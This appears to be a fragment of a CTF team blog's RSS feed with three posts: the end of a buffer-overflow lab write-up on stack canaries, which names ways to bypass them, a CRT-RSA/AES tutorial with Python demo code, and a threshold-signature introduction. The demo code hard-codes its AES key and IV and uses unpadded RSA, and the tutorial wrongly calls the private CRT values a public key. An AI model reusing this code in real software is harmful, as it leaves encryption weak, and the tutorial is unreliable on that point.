+0x080484f8 &lt;+36&gt;: call 0x80483d0 &lt;strcpy@plt&gt;
+0x080484fd &lt;+41&gt;: mov eax,0x1
+0x08048502 &lt;+46&gt;: mov edx,DWORD PTR [ebp-0xc]
+0x08048505 &lt;+49&gt;: xor edx,DWORD PTR gs:0x14
+0x0804850c &lt;+56&gt;: je 0x8048513 &lt;bof+63&gt;
+0x0804850e &lt;+58&gt;: call 0x80483b0 &lt;__stack_chk_fail@plt&gt;
+0x08048513 &lt;+63&gt;: leave
+0x08048514 &lt;+64&gt;: ret
+End of assembler dump.</pre>
+<p>&nbsp;</p>
+<p>The compiler firstly moves a random value to stack at address <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7794f0c456c0855443a03d4c63788683.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and compares these 2 values by using XOR in the end of this<br />
+function. If the value in stack is modified then the program will jump to the function stackchkfail() which notifies an error message “stack smashing detected” eventually. This means if our program overwrites the whole stack and tries to illegally control the stack pointers will make it halted. There are some techniques to bypass the Stack Guard : leak the value of canaries or overwrite the entire stack all the way up to the arguments and environment vectors but the stack cookie check would not working properly. Moreover please take a look at this <a href="https://media.blackhat.com/bh-us-10/whitepapers/Le/BlackHat-USA-2010-Le-Paper-Payload-already-inside-data-reuse-for-ROP-exploits-wp.pdf" target="_blank">paper</a>.</p>
+<p>&nbsp;</p>
+<p>-cmxd</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2016/03/12/writeup-for-beginners-bof-vulnerability-lab-syracuse-university/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">486</post-id>	</item>
+		<item>
+		<title>Basic concepts of Chinese Remainder Theorem with respect of RSA/AES</title>
+		<link>https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/</link>
+				<pubDate>Fri, 11 Mar 2016 07:29:37 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[crypto]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=465</guid>
+				<description><![CDATA[&#160; Chinese Remainder Theorem ========================= Suppose are positive integers and coprime in pair. For any sequence of integers , there exists an integer x solving the following system of congruence equations: There exists an unique modulo solution of the system of simultaneous congruences above: in which: **Example**: Solve: Therefore, Hence, the solution of this simultaneous congruences is for all k &#8230; <a href="https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/" class="more-link">Continue reading <span class="screen-reader-text">Basic concepts of Chinese Remainder Theorem with respect of RSA/AES</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>&nbsp;</p>
+<p><strong>Chinese Remainder Theorem</strong><br />
+=========================</p>
+<p>Suppose <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_6f65815f75a5b0addfb2fcbf314e7448.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> are positive integers and coprime in pair. For any sequence of integers <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_2e6af3c4b843457fb8f92cab80c4becd.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, there exists an integer x solving the following system of congruence equations:</p>
+<p><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_c08ae2e6f46d3cc4c6048c8c6efff3bd.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span><br />
+There exists an unique modulo solution of the system of simultaneous congruences above:</p>
+<p><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_4a53df5368873e5db4c21d41fb345815.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>in which:<br />
+<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_efdc335c017fa207c76d2e89a3ada645.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:2px;' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p><span id="more-465"></span></p>
+<p>**<em>Example</em>**:<br />
+<span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_d05fe06da4390a753c6a6356e2982f58.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span><br />
+<strong>Solve</strong>: <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_81285716f0e377a469ca3e2cd13d41cb.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:2px;' class='tex' alt="" data-recalc-dims="1" /></span><br />
+Therefore, <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ba8bcb0646f18f216e41f1c03b1a0c0e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Hence, the solution of this simultaneous congruences is <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_15fce7133b87887b7aa927c811d53610.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> for all k are integers.</p>
+<p><strong>RSA using the Chinese remainder theorem</strong><br />
+=======================================</p>
+<p>In RSA scheme using the Chinese remainder theorem, the following values are precomputed and stored as a public key:<br />
+<span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_e1d860acb91450876d8d51909bada477.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Therefore, we can compute the message from given ciphertext more effienctly as follow:<br />
+<span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ac7d1b7d1b40bf96431cd9823a05db12.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>This scheme is more efficient than computing <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_83b1bf433207a854fe45f0f9d3a7fc39.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> because these two modular exponentiations both use a smaller exponent and a smaller modulus.</p>
+<p>**<strong>Proof</strong>:**</p>
+<p>We know that: <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_f813d35f5f2190daea17180b7be9c472.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Note that the exponents are reduced module p-1 and q-1. This can be done using Fermat’s little theorem because p and q.Then, we recombine the; that is, we find a number m such that:<br />
+<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_cd40e72c60749fa4e52e75a7d22e6caf.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Because of the Chinese Remainder Theorem (and because p and q are relatively prime), we can immediately deduce that: <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_097d34979b961d61d42d5b78d4cbc04e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> which is exactly what we were trying to compute.</p>
+<p>Now, the questions in your comments appear to be asking about the details of this recombination step. It is actually fairly easy to see the correctness of the algorithm. To make the last step work, we need to show that we have come up with a value m such that: <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_43164028cde5a60697cdc129964fba81.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>As for the the first criteria <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_480651f75f21f7373d026bcbfcd45722.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, well, that’s straight-forward; we know that <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_86a63a6f1b4f2486377299139782d7de.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9a529af765aed258f237f010b45d22dd.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and so the smallest that m can be is <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_5484bf1b2d0764fb22c27a39acd860f7.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, and the largest it can be is <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_608f1da7ae2749e00acd8a950385ced9.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>As for the third criteria, that’s also straight-forward;<br />
+<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7bb612d443085a1083671478c8a79e1f.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p><span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_8d0decc190b4b6070ec037760abae463.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Now, <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_654e1be0a27e48ef9b02cf0a297e4d1b.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> is defined to be the number that, when multiplied by q modulo p, results in 1, or <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_332063c27de33f547fdbe84757a46440.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Now, because the above equation is, in fact, computed modulo p, we can replace <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_14bc04d33d047d6ed75ac3d318815d82.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> with 1, which gives us:</p>
+<p><span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_f22a0c1c2fc0c3366866af37d07bd368.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p><strong>Program for secure communication</strong><br />
+================================</p>
+<p>My following program was written using Python language. It includes 4 main parts:</p>
+<p>- Take user text input from the console and encrypt it using AES-128 using built-in library Crypto.Cipher</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_encrypt.png?ssl=1" rel="attachment wp-att-475"><img data-attachment-id="475" data-permalink="https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/aes_encrypt/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_encrypt.png?fit=257%2C28&amp;ssl=1" data-orig-size="257,28" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="aes_encrypt" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_encrypt.png?fit=257%2C28&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_encrypt.png?fit=257%2C28&amp;ssl=1" class="alignnone size-full wp-image-475" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_encrypt.png?resize=257%2C28&#038;ssl=1" alt="aes_encrypt" width="257" height="28" data-recalc-dims="1" /></a></p>
+<p>- Encrypt the AES key using RSA where prime p,q were generated<br />
+randomly with the length of 1024 bits</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?ssl=1" rel="attachment wp-att-476"><img data-attachment-id="476" data-permalink="https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/rsa_encrypt/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?fit=641%2C112&amp;ssl=1" data-orig-size="641,112" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="rsa_encrypt" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?fit=300%2C52&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?fit=604%2C106&amp;ssl=1" class="alignnone size-medium wp-image-476" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?resize=300%2C52&#038;ssl=1" alt="rsa_encrypt" width="300" height="52" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?resize=300%2C52&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_encrypt.png?w=641&amp;ssl=1 641w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>- Decrypt the key</p>
+<p>- Using the normal RSA function</p>
+<pre class="lang:default decode:true">def decrypt(self, c,d,n):
+return pow(c,d,n)
+</pre>
+<p>&nbsp;</p>
+<p>- Using the CRT approach</p>
+<pre class="lang:default decode:true"> {frame="single"}
+def decryptCRT(self,c,p,q,d,dp,dq,qi):
+m1 = pow(c,dp,p)
+m2 = pow(c,dq,q)
+h = (qi*(m1-m2))%p
+m = m2+ h*q
+return m</pre>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_decrypt.png?ssl=1" rel="attachment wp-att-477"><img data-attachment-id="477" data-permalink="https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/rsa_decrypt/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_decrypt.png?fit=256%2C14&amp;ssl=1" data-orig-size="256,14" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="rsa_decrypt" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_decrypt.png?fit=256%2C14&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_decrypt.png?fit=256%2C14&amp;ssl=1" class="alignnone size-full wp-image-477" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/rsa_decrypt.png?resize=256%2C14&#038;ssl=1" alt="rsa_decrypt" width="256" height="14" data-recalc-dims="1" /></a></p>
+<p>- Decrypt the message using AES128 decryption and print it on<br />
+the screen.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_decrypt.png?ssl=1" rel="attachment wp-att-478"><img data-attachment-id="478" data-permalink="https://babyphd.net/2016/03/11/basic-concepts-of-chinese-remainder-theorem-with-respect-of-rsaaes/aes_decrypt/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_decrypt.png?fit=194%2C14&amp;ssl=1" data-orig-size="194,14" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="aes_decrypt" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_decrypt.png?fit=194%2C14&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_decrypt.png?fit=194%2C14&amp;ssl=1" class="alignnone size-full wp-image-478" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/aes_decrypt.png?resize=194%2C14&#038;ssl=1" alt="aes_decrypt" width="194" height="14" data-recalc-dims="1" /></a></p>
+<p><strong>Report of execution time</strong><br />
+========================</p>
+<p>Each execution of the encryption and decryption functions is too short. Therefore, I measure the average time of total 1000 executions to compare between each method. To ensure that the time measurement does not affect the process execution, this program used an external call based on Python’s ’timer’ library to calculate the difference between start and end of each run in milliseconds.</p>
+<p>&nbsp;</p>
+<pre class="lang:default decode:true">self.end = time.time()
+self.secs = self.end - self.start
+self.msecs = self.secs * 1000 # millisecs
+if self.verbose:
+print 'Elapsed time: %f ms' % self.msecs</pre>
+<p>**Functions** **1000 times (second)** **Average (second)**<br />
+-------------------- ------------------------- ----------------------<br />
+AES128 encryption                 0.015999794                 0.000016<br />
+AES128 decryption                 0.014999866                 0.000015<br />
+RSA encryption                       0.254999876                 0.000255<br />
+RSA decryption                       39.37100005                 0.039371<br />
+RSA CRT decryption                 12.02799988                 0.012028<br />
+Total                                          51.68499947                 0.051685</p>
+<p>Table <strong>time</strong> shows the execution time of RSA scheme is much larger than AES128 scheme. This result explains why RSA should being used in key exchange while parties encrypt their information using AES cryptosystem. Another significant result is that the RSA-CRT decryption method is approximately 3 times faster than normal RSA decryption.</p>
+<p><em>Hope this article can bring cryptography motivation to some Math/IT students and players who were exhausted in enjoying CTF challenges, or at least it can be a good reference for somebody.</em></p>
+<p><em>-chuymichxinhdep</em></p>
+<p><strong>Ref:</strong></p>
+<p>1&lt;https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29&gt;</p>
+<p>2 &lt;http://crypto.stackexchange.com/questions/2575/chinese-remainder-theorem-and-rsa&gt;</p>
+<p><strong>**APPENDIX**</strong></p>
+<pre class="lang:default decode:true">from Crypto.Cipher import AES
+import math,random
+from fractions import gcd
+from random import randrange
+from collections import namedtuple
+from math import log
+from binascii import hexlify, unhexlify
+from timer import Timer
+
+class RSA():
+def __init__(self):
+self.KeyPair = namedtuple('KeyPair', 'public private CRT')
+self.Key = namedtuple('Key', 'exponent modulus')
+self.KeyCRT = namedtuple('KeyCRT', 'p q')
+def is_prime(self,n, k=30):
+# Miller-Rabin Test
+if n &lt;= 3:
+return n == 2 or n == 3
+neg_one = n - 1
+
+# write n-1 as 2^s*d where d is odd
+s, d = 0, neg_one
+while not d &amp; 1:
+s, d = s+1, d&gt;&gt;1
+assert 2 ** s * d == neg_one and d &amp; 1
+
+for i in xrange(k):
+a = randrange(2, neg_one)
+x = pow(a, d, n)
+if x in (1, neg_one):
+continue
+for r in xrange(1, s):
+x = x ** 2 % n
+if x == 1:
+return False
+if x == neg_one:
+break
+else:
+return False
+return True
+
+def randprime(self,N=10**8):
+p = 1
+while not self.is_prime(p):
+p = randrange(N)
+return p
+
+def multinv(self,modulus, value):
+'''Multiplicative inverse in a given modulus
+'''
+# http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm
+x, lastx = 0, 1
+a, b = modulus, value
+while b:
+a, q, b = b, a // b, a % b
+x, lastx = lastx - q * x, x
+result = (1 - lastx * modulus) // value
+if result &lt; 0:
+result += modulus
+assert 0 &lt;= result &lt; modulus and value * result % modulus == 1
+return result
+
+def keygen(self,N, public=None):
+''' Generate public and private keys from primes up to N.
+Optionally, specify the public key exponent (65537 is popular choice).
+'''
+
+# http://en.wikipedia.org/wiki/RSA
+p = self.randprime(N)
+q = self.randprime(N)
+composite = p * q
+totient = (p - 1) * (q - 1)
+if public is None:
+while True:
+private = randrange(totient)
+if gcd(private, totient) == 1:
+break
+public = self.multinv(totient, private)
+else:
+private = self.multinv(totient, public)
+assert public * private % totient == gcd(public, totient) == gcd(private, totient) == 1
+return self.KeyPair(self.Key(public, composite), self.Key(private, composite), self.KeyCRT(p, q))
+def encrypt(self, m,e,n):
+return pow(m,e,n)
+def decrypt(self, c,d,n):
+return pow(c,d,n)
+def decryptCRT(self, c,p,q,d,dp,dq,qi):
+m1 = pow(c,dp,p)
+m2 = pow(c,dq,q)
+h = (qi*(m1-m2))%p
+m = m2+ h*q
+return m
+class PKCS7Encoder():
+"""
+Technique for padding a string as defined in RFC 2315, section 10.3,
+note #2
+"""
+class InvalidBlockSizeError(Exception):
+"""Raised for invalid block sizes"""
+pass
+
+def __init__(self, block_size=16):
+if block_size &lt; 2 or block_size &gt; 255:
+raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
+'between 2 and 255, inclusive')
+self.block_size = block_size
+
+def encode(self, text):
+text_length = len(text)
+amount_to_pad = self.block_size - (text_length % self.block_size)
+if amount_to_pad == 0:
+amount_to_pad = self.block_size
+pad = chr(amount_to_pad)
+return text + pad * amount_to_pad
+
+def decode(self, text):
+pad = ord(text[-1])
+return text[:-pad]
+iv = "this is iv123456"
+key = "this mus be a 16"
+
+def AES_encrypt(iv,key,message):
+obj = AES.new(key, AES.MODE_CBC, iv)
+pkcs7 = PKCS7Encoder()
+return obj.encrypt(pkcs7.encode(message)).encode("hex")
+
+def AES_decrypt(iv,key,cipherText):
+obj = AES.new(key, AES.MODE_CBC, iv)
+pkcs7 = PKCS7Encoder()
+return pkcs7.decode(obj.decrypt(cipherText.decode('hex')))
+
+message = raw_input("Input message:")
+with Timer() as t:
+cipherText = AES_encrypt(iv,key,message)
+
+print cipherText
+print "AES encrypt: %s s" % t.secs
+
+rsa = RSA()
+pk,sk,primes = rsa.keygen(2**1024, 65537)
+
+message = int(cipherText.encode("hex"),16)
+
+with Timer() as t:
+
+rsacipher = rsa.encrypt(message,pk.exponent, pk.modulus)
+
+print rsacipher
+
+print "RSA Encrypt: %s s" % t.secs
+with Timer() as t:
+
+messagersa = hex(rsa.decrypt(rsacipher, sk.exponent,sk.modulus)).replace("0x","").replace("L","").decode('hex')
+print "RSA Decrypt: %s s" % t.secs
+print messagersa
+#Pre compute RSA CRT
+p = primes.p
+q = primes.q
+dp = sk.exponent % (p-1)
+dq = sk.exponent % (q-1)
+qi = rsa.multinv(p,q)
+#RSA-CRT Decryption
+
+with Timer() as t:
+for i in xrange(1):
+messagersacrt = hex(rsa.decryptCRT(rsacipher,p,q,sk.exponent,dp,dq,qi)).replace("0x","").replace("L","").decode('hex')
+print "RSA Decrypt CRT : %s s" % t.secs
+print messagersacrt
+
+with Timer() as t:
+plainText = AES_decrypt(iv,key,messagersa)
+print "Decrypted message:", plainText
+print "AES decrypt: %s s" % t.secs
+```</pre>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">465</post-id>	</item>
+		<item>
+		<title>Introduction to Threshold signature scheme</title>
+		<link>https://babyphd.net/2016/03/10/introduction-to-threshold-signature-scheme/</link>
+				<pubDate>Thu, 10 Mar 2016 03:07:10 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[crypto]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=399</guid>
+				<description><![CDATA[THRESHOLD SIGNATURE SCHEME Introduction Assuming there are 20 employees in a company, and if each employee has his or her own copy of the secret key then it is hard to assure on individuals due to compromise and machine break down. In the other hand, if there is a valid signature requires all 20 employees’ &#8230; <a href="https://babyphd.net/2016/03/10/introduction-to-threshold-signature-scheme/" class="more-link">Continue reading <span class="screen-reader-text">Introduction to Threshold signature scheme</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><strong>THRESHOLD SIGNATURE SCHEME</strong></p>
+<ol>
+<li><strong>Introduction</strong></li>
+</ol>
+<p>Assuming there are 20 employees in a company, and if each employee has his or her own copy of the secret key then it is hard to assure on individuals due to compromise and machine break down. In the other hand, if there is a valid signature requires all 20 employees’ signature in the company then it will be very secure but not be easy to use. Therefore we can implement a scheme which requires only sign 5 or more out of 20 employees then it will be valid and that is exactly what a (5,20) threshold signature scheme tries to achieve. In addition, if a threat agent wants to compromise the system and obtain a message, he must compromise at least 5 people in the scheme and that is a harder thing to do compared to a traditional public scheme.</p>
+<p><span id="more-399"></span></p>
+<p><strong>2. Threshold signature scheme</strong></p>
+<p>Threshold signature scheme is a branch of public key cryptography and multi-party computation particularly. In a k-out-of-n threshold crypto-system (k, n) where 1 &lt; k ≤ n, we generate and split the secret decryption exponent d into n different pieces D<sub>1</sub>,…,D<sub>n</sub>, which are then distributed privately to n parties. This enables:</p>
+<p>• Knowledge of any k or more D<sub>i</sub> pieces makes D easily computable.</p>
+<p>• Knowledge of any k- 1 or fewer D<sub>i</sub> pieces leaves D completely undetermined (in the sense that all its possible values are equally likely) [1]</p>
+<p><strong>2.1. Shared RSA Threshold Scheme</strong></p>
+<p>Similarly to traditional RSA, in shared RSA scheme, we have the public components are moduli N= pq and the encryption exponent e where e is co-prime to N. Additionally, both Boyd [2] and Frankel [3] independently proposed a simple and solution for distributed RSA. The decryption key d is additively shared amongst n parties where d = d<sub>1</sub> + d<sub>2</sub> + · · · + d<sub>n</sub>, and signing is simply calculated as follows:</p>
+<p>s = m<sup>d</sup>= m<sup>d</sup><sub>1</sub>· · · m<sup>d</sup><sub>n </sub>(mod N), and each s<sub>i</sub> = m<sup>di</sup> (mod N) is called the partial signature or signature share.</p>
+<p>Decryption is more complicated as there are more parties who get involved in the scheme. Assuming there are n parties and the prime factors of N remain unknown to every person. Each party Pi now only knows the tuple &lt; p<sub>i</sub>, q<sub>i</sub>, d<sub>i</sub> &gt; and keeps it secret to any other parties, and they are also required to satisfy the four following conditions:</p>
+<p>1. p is an unknown big prime number and <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-1.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>2. q is an unknown big prime number and <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-2.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>3. The unknown decryption exponent <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-3.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>4. And ed = 1 (mod φ(N )).</p>
+<p>I am going to show a way to encrypt a message and decrypt a cipher text based on Discrete Logarithm Problem presented in [4].</p>
+<ul>
+<li><strong>Encryption: </strong>is similar to RSA : <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-4.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></li>
+<li><strong>Decryption: </strong>each party computes <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-5.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> and then sends <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-6.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> to all other parties. Each party knows all <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-7.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> and then can recovers the original message (m) [5] as follow:</li>
+</ul>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-8.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<ul>
+<li><strong><em>Advantages</em>: </strong>Simple and easy to deploy.</li>
+<li><strong><em>Disadvantages</em>: </strong>requires a trusted party and there is no verification process to avoid compromised party.</li>
+</ul>
